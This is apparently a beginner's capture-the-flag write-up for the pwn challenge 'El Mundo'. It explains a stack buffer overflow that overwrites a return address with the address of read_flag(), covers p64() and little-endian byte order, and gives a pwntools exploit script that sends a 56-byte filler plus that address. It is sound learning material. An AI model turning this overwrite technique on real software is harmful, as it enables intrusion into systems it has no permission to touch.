# Introduction
**El Mundo** is a pwn challenge that contains a buffer-overflow problem where the address of a called function is changed.

The challenge is introductory as it guides you on how to solve it.
# Enumeration

after running the `el_mundo` binary, we observe the following:

![](assets/El%20Mundo.png)

![](assets/El%20Mundo-1.png)

After which we get an input prompt. We are to cause a buffer overflow and deliberately insert the address of the `read_flag()` function into the `Return Address` location.

We notice in the first image that we need to cover 56 bytes before we reach the `Return Address` location.
# Exploitation

Reading the provided `solver.py` function, we see the following:

![](assets/El%20Mundo-2.png)

The highlighted line shows the payload, which includes a filler part (the 'A'\*nbytes) and the return address part afterwards. The code uses a function that I am unfamiliar with, which is `p64()`.

`p64()` converts the value that is passed to it into 8-bytes in little endian format to match how the data appears in memory.

The output of the `p64()` in our example is is:
`p64(0x4016b7)` -> `b7 16 40 00 00 00 00 00`

> Little-endian is a way to store a multi-byte number so the **least significant byte (LSB)** comes first in memory (lowest address).

Note: we are using `p64()` since this is a 64-bit binary. if it were 32, we would use `p32()`.

## Exploitation Script

Since I am still learning, I like to write my own scripts even if they would appear very similar to the provided solver scripts.

Here's mine:
```python
#!/usr/bin/env python3

from pwn import *

def getConnection():
    try:
        host,port = sys.argv[1].split(':')
        return remote(host,port)
    except IndexError:
        print("Usage: exploit.py <ip:port>")
        exit(1)

connection = getConnection()

offset = 56
flag_address = p64(0x4016b7)

payload = b'A'*offset + flag_address

connection.sendlineafter(b'>',payload)

flag = connection.recvline_contains(b'HTB').decode('ascii')

print("Flag:",flag)  
```

# Learning Outcomes

Learned the use of the function `p64()`, what little-endian is, and how to use buffer overflow to manipulate the return address and call a function of interest.

# Next Steps

Solving more buffer overflow questions that have less handholding to drill in the ideas presented here.